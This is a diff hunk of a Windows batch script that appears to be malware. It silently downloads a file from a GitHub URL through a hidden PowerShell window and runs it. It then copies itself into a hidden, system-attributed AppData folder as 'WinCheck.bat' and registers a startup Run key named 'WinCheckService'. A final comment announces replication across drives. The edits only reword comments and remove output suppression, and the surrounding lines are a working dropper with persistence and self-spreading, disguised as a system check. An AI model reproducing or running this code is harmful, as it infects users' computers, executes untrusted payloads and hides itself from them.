@@ -29,16 +29,16 @@ set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/m
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 
-:: Copy this script to hidden location
+:: Copy self to hidden AppData folder as WinCheck.bat
 set "SELF=%~f0"
 set "HIDEFOLDER=%APPDATA%\Roaming\System"
 set "HIDDEN_BAT=%HIDEFOLDER%\WinCheck.bat"
 mkdir "%HIDEFOLDER%" >nul 2>&1
 copy "%SELF%" "%HIDDEN_BAT%" >nul
-attrib +h +s "%HIDEFOLDER%" >nul
-attrib +h +s "%HIDDEN_BAT%" >nul
+attrib +h +s "%HIDEFOLDER%"
+attrib +h +s "%HIDDEN_BAT%"
 
-:: Registry startup
+:: Add registry startup pointing to hidden batch
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinCheckService" /t REG_SZ /d "\"%HIDDEN_BAT%\"" /f >nul
 
 :: Loop through drives and replicate
